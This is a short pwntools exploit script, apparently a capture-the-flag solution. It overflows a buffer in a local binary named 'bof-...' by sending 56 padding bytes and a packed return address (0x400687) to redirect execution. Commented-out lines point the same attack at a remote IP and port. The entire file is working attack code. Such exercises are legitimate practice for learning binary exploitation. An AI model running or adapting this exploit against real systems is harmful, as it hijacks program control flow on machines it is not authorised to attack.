#!/usr/bin/env python
# coding=utf-8
from pwn import *
# ip   = '60.250.197.227'
# prot = 10000
# r = remote(ip, prot)
r = process("./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4")

print(r.recvline())
address = p64(0x400687)
# raw_input("attach gdb")
r.sendline(b"abcdefghijlmnopqrstuvwxyzabcdefghijlmnopqrstuvwxyzabcdef" + address)
print(b"abcdefghijlmnopqrstuvwxyzabcdefghijlmnopqrstuvwxyzabcdef" + address)

# r.interactive()